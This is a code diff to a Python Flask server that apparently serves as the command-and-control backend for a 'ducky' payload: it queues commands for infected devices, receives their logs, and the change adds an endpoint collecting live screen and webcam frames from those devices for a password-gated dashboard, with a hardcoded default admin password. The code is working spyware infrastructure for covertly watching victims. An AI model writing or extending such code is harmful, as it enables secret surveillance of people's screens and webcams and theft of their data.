@@ -19,7 +19,9 @@ SUPABASE_KEY = os.environ.get("SUPABASE_KEY") # MAKE SURE THIS IS THE SERVICE_RO
 DASHBOARD_PASSWORD = os.environ.get("DASHBOARD_PASSWORD", "ducky_admin_2024")
 
 command_queue = {}
-screen_frames = {} # NEW: Store latest screen frames for live viewing
+# --- NEW: In-memory cache for live frames ---
+# Structure: { "device_id": { "screen_0": "base64_img", "screen_1": "...", "webcam": "..." } }
+frame_cache = {}
 
 # ---------------------------------------------------------
 # HELPER FUNCTIONS
@@ -117,6 +119,44 @@ def get_logs(device_id):
         return jsonify({"error": "Database fetch failed"}), 500
 
 # ---------------------------------------------------------
+# LIVE VIEW ENDPOINTS (NEW)
+# ---------------------------------------------------------
+@app.route('/frames', methods=['POST'])
+def push_frame():
+    """Payload posts new screen/webcam frames here."""
+    data = request.json
+    device_id = data.get("device_id")
+    frame_type = data.get("frame_type") # "screen" or "webcam"
+    monitor_index = data.get("monitor_index", 0)
+    frame_data = data.get("data")
+    
+    if not all([device_id, frame_type, frame_data]):
+        return jsonify({"error": "Missing required frame data"}), 400
+
+    if device_id not in frame_cache:
+        frame_cache[device_id] = {}
+        
+    cache_key = f"{frame_type}_{monitor_index}" if frame_type == "screen" else "webcam"
+    frame_cache[device_id][cache_key] = frame_data
+    
+    return jsonify({"status": "frame received"}), 200
+
+@app.route('/frames/<device_id>/<cache_key>', methods=['GET'])
+def get_frame(device_id, cache_key):
+    """Dashboard polls this to get the latest frame."""
+    # SECURITY CHECK
+    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD:
+        return jsonify({"error": "Unauthorized access"}), 401
+
+    device_frames = frame_cache.get(device_id, {})
+    frame = device_frames.pop(cache_key, None) # Pop to ensure we get a new frame next time
+
+    if frame:
+        return jsonify({"frame": frame}), 200
+    else:
+        return jsonify({"error": "Frame not available"}), 404
+
+# ---------------------------------------------------------
 # PAYLOAD ENDPOINTS
 # ---------------------------------------------------------
 @app.route('/logs', methods=['POST'])
@@ -134,27 +174,6 @@ def push_logs():
         return jsonify({"status": "success"}), 200
     except requests.exceptions.RequestException: 
         return jsonify({"error": "Database push failed"}), 500
-
-@app.route('/screen/<device_id>', methods=['POST', 'GET'])
-def handle_screen(device_id):
-    """Handles screen sharing frames. POST from payload, GET from dashboard."""
-    # Payload posts base64 frames here
-    if request.method == 'POST':
-        data = request.json
-        if not data or 'frame' not in data:
-            return jsonify({"error": "Missing frame data"}), 400
-        # Store the latest frame in the in-memory dictionary
-        screen_frames[device_id] = data['frame']
-        return jsonify({"status": "frame received"}), 200
-
-    # Dashboard gets the latest frame from here
-    if request.method == 'GET':
-        # SECURITY CHECK: Make sure the request came from your dashboard
-        if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD:
-            return jsonify({"error": "Unauthorized access"}), 401
-        
-        frame = screen_frames.get(device_id, None)
-        return jsonify({"frame": frame})
 
 @app.route('/issue', methods=['POST'])
 def issue_command():
